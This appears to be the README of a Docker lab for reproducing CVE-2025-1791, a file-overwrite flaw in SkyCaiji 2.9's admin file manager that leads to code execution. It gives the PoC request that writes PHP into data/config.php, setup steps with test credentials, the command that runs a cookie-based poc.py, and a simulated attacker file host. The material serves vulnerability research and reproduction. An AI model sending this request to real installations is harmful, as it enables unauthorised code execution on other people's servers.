# CVE-2025-1791 Reproduction Environment

## Vulnerability Summary

In SkyCaiji 2.9, `vendor/skycaiji/app/admin/controller/Tool.php` accepts unfiltered `save_data` in `fileAction` (`op=save`), which can overwrite files under `data/`, such as `data/config.php`. This can lead to code execution.

## Official PoC Pattern

`POST /index.php?s=/admin/tool/file` with:

- `op=save`
- `file=config.php`
- `save_data=<?php phpinfo();?>`

## Environment Setup

### Prerequisites
- Docker
- Docker Compose

### Start Environment

```bash
docker-compose up -d
```

### Initial Installation

Use browser to click through installer:

1. Open `http://localhost:8085`
2. Click `接受` license
3. Fill DB settings:
   - host: `db`
   - port: `3306`
   - name: `skycaiji`
   - user: `root`
   - password: `root123`
   - prefix: `sky_`
4. Fill admin settings:
   - username: `admin`
   - password: `Admin@123`
   - email: `admin@test.com`
5. Finish installation and enter admin login page

### Run Exploit

```bash
cd exp_workspace
python poc.py "http://localhost:8085" \
  --cookie "PHPSESSID=...; <other-cookie-pairs>" \
  --unlock-password "Admin@123"
```

Notes:
- The PoC is cookie-only (no username/password login flow in script).
- `--unlock-password` is optional, used only when file manager asks for password again.

### Stop Environment

```bash
docker-compose down
```

## Services

| Service | Port | Description |
|---------|------|-------------|
| web | 8085 | SkyCaiji Application |
| db | 3306 | MySQL Database |
| attacker | 9999 | HTTP server (simulates malicious file host) |

## Credentials

- Admin: admin / Admin@123
